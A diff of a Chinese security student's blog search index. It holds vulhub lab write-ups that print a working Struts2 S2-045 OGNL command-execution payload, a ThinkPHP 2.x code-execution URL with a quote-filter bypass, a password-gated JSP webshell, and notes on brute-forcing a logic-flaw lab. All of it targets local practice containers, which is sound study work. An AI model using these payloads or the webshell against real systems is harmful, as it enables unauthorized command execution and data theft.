@@ -214,6 +214,34 @@
       </tags>
   </entry>
   <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
+<ol>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+
+<p>可以直接执行任意命令：</p>
+<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Http状态码详解</title>
     <url>/2023/11/04/Http%E7%8A%B6%E6%80%81%E7%A0%81%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="Http状态码详解"><a href="#Http状态码详解" class="headerlink" title="Http状态码详解"></a>Http状态码详解</h1><p>转载自:<a href="https://config.net.cn/tools/HttpStatusCode.html">https://config.net.cn/tools/HttpStatusCode.html</a></p>
@@ -698,34 +726,6 @@
       <tags>
         <tag>GPG</tag>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Jupyter Notebook 未授权访问漏洞</title>
-    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
-<ol>
-<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
-<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
-
-<p>可以直接执行任意命令：</p>
-<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
-
-<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1282,6 +1282,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
+    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
+<ol>
+<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
+<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
+
+<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
+<p>进入容器验证，成功读取</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
+<hr>
+<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入基础</title>
     <url>/2023/10/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>转载自：<a href="https://www.anquanke.com/post/id/205376">SQL注入基础整理及Tricks总结-安全客 - 安全资讯平台 (anquanke.com)</a></p>
@@ -1811,32 +1847,31 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
-    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
+    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
+    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
 <ol>
-<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
-<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
+<li>复现环境中的代码执行漏洞，截图证明</li>
+<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
 </ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
+<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
 
-<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
+<p>即可执行<code>phpinfo()</code></p>
+<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
 
-<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
-<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
+<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
+<p>但是这里单引号双引号都被过滤了</p>
+<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
 
-<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
 
-<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
-<p>进入容器验证，成功读取</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
-<hr>
-<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
+<p>得到文件列表</p>
+<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
+<p>进入容器验证</p>
+<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
 ]]></content>
       <categories>
         <category>vulhub</category>
@@ -1887,41 +1922,6 @@
 <p>这里贴出我使用的的木马</p>
 <figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
-    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
-<ol>
-<li>复现环境中的代码执行漏洞，截图证明</li>
-<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
-<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
-<p>即可执行<code>phpinfo()</code></p>
-<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
-
-<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
-<p>但是这里单引号双引号都被过滤了</p>
-<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
-
-<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
-
-<p>得到文件列表</p>
-<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
-<p>进入容器验证</p>
-<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
 ]]></content>
       <categories>
         <category>vulhub</category>
@@ -2004,6 +2004,28 @@
       <tags>
         <tag>漏洞</tag>
         <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>idea</title>
+    <url>/2023/12/22/idea/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="31e4a8628ca654a0540ceefdd021799571141910f9f0b46033cbe1e95085210d">ab32ff3ecdeb2ad34c3c6e9769499484e78cf360b6cf6011bc23c89e19bc45e5c60375205067a83cfb1ad9a775b57df5abadb1618e460f90cd0f12ea67f8e9a9298e860fc792c2e876db9319a9352a2ae2620f75d6b5135f467268969d26e24f55f0c6872793179bf37344f5e22b07ef75c55879522ce632040655b2af7e28a710d8e00dd2f104aea1a9ebeb66864e9463dedf04eca925cda512ae3a6b11012dfcd10bed78569ed8c99aba9c275801a091446f5aff762058ca251555e6c87bd8912db923a691c1bd6dfb3d20e1d5d35054fdb5c0c7a2ad26b7360dd65f8cdcb3bc89dd936a16cada039fd57f6b8648ffb6b3441beb6082ecec66569c19b574ce72fae8f0281bc1b5cd449b58b2d7dff580e59ec65b86837e52780649ffb18c0c</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>想法</tag>
       </tags>
   </entry>
   <entry>
@@ -2210,23 +2232,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
-<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用河马对PHP Webshell进行查杀</title>
     <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
     <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
@@ -2269,6 +2274,23 @@
       </categories>
       <tags>
         <tag>Webshell扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
       </tags>
   </entry>
   <entry>
@@ -3038,132 +3060,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       <tags>
         <tag>vimwiki</tag>
         <tag>vim-markDown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞靶场环境——logic</title>
-    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
-<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
-<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
-<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
-<p>burpsuite开启代理</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
-<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
